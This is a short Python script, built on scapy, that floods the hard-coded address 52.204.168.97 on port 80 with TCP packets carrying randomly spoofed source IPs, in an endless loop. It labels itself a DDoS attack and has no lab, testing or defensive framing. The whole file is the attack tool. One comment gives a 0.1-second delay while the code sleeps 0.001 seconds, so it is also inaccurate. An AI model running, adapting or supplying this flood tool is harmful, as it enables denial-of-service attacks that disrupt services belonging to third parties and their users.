from scapy.all import *
import random
import time

# Function to generate a random IP address
def generate_random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

# Function to perform the DDoS attack


def perform_ddos(target_ip, target_port):
    print("Starting DDoS attack...")
    packet_count = 0
    while True:
        # Generate a random source IP address
        src_ip = generate_random_ip()
        
        # Create a TCP packet
        packet = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port)
        
        # Send the packet
        send(packet, verbose=False)
        
        # Increment the packet count
        packet_count += 1
        
        # Print the packet count
        print(f"\rSent {packet_count} packets", end="", flush=True)
        
        # Introduce a delay of 0.1 seconds between each packet
        time.sleep(0.001)

# Set the target IP address and port
target_ip = '52.204.168.97'
target_port = 80

# Start the DDoS attack
perform_ddos(target_ip, target_port)
